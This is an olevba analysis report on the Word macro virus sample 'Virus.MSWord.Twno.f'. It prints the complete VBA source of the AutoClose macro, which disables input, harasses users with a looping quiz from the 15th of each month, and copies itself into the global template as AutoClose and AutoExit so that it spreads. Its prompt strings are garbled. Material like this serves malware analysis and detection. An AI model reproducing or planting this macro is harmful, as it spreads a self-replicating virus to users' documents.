olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.f-de17cf2b18337cfd508b9604dce8b39beb8d1558
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.f-de17cf2b18337cfd508b9604dce8b39beb8d1558 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Twno.f-de17cf2b18337cfd508b9604dce8b39beb8d1558 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(2)
Dim monkey
Dim con
Dim tog$
Dim i
Dim ans$
Dim x
Dim IQ
Dim aa
Dim s
Dim a$
Dim am$
Dim IQ1
Dim aaa
Dim ss
WordBasic.DisableInput 1
Rem  sscan�j �j !  и 硂 �� 痜 瑀 �� ぃ 穦 甡 �H !!
Rem  碞 陈 沸 �A �O �� 紀 弘 �� 琵 ウ 胣 �� ! OK ?
If WordBasic.Day(WordBasic.Now()) >= 15 Then
sick:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo sick
monkey = -1
con = WordBasic.Int(WordBasic.Day(WordBasic.Now()) / 2)
tog$ = ""
i = 0
While monkey = -1
For i = 0 To 2
nm__(i) = WordBasic.Int(Rnd() * 10)
con = (con + nm__(i))
If i = 2 Then
tog$ = tog$ + Str(nm__(2))
GoTo banana
End If
tog$ = tog$ + Str(nm__(i))
Next i
banana:
WordBasic.Beep
ans$ = WordBasic.[InputBox$]("さぱ琌 " + WordBasic.[Date$]() + " ,蛤�A�堡@�硬q盞絏�汗C栏" + Chr(13) + _
"�p狦�A氮岿,ê碞ぃ�n�堡F!        " + Chr(13) + _
tog$ + " 硂碭�蛹痞r琵�A羛稱�飙�ㄢ�旒譬O?氮�砖Mら戳Τ闽!�[搭�及＠H獽�A!", "＋   �� !�A�捍及佣W筁180盾? ")
If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = WordBasic.[LTrim$](Str(con)) Then
WordBasic.Beep
WordBasic.MsgBox "ぃ岿翅!,�コ擐A氮癸�F! ", _
"垛! �A�捍及拥垂锒W筁180!"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Font:="灿��砰", Points:=64, Bold:=1, Underline:=1
WordBasic.Insert "垛! �A�捍及拥垂锒W筁180!"
For x = 1 To 10
WordBasic.Beep
Next x
GoTo exit_
Else
WordBasic.Beep
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Font:="灿��砰", Points:=64, Bold:=1, Underline:=1
WordBasic.Insert "�A�捍及�!垛!ぃ�缁蚣顺�!"
GoTo sick
End If
Wend
End If

IQ = WordBasic.CountMacros(0)
If IQ > 0 Then
For aa = 1 To IQ
If WordBasic.[MacroName$](aa, 0) = "AutoClose" Then
s = 1
End If
Next aa
End If

a$ = WordBasic.[FileName$]()
am$ = a$ + ":AutoClose"
If s <> 1 Then
WordBasic.MacroCopy am$, "AutoClose", -1
WordBasic.MacroCopy am$, "AutoExit", -1
End If

IQ1 = WordBasic.CountMacros(1)
If IQ1 > 0 Then
For aaa = 1 To IQ1
If WordBasic.[MacroName$](aaa, 1) = "AutoClose" Then
ss = 1
End If
Next aaa
End If

If ss <> 1 Then
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "AutoClose", am$, -1
End If

exit_:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

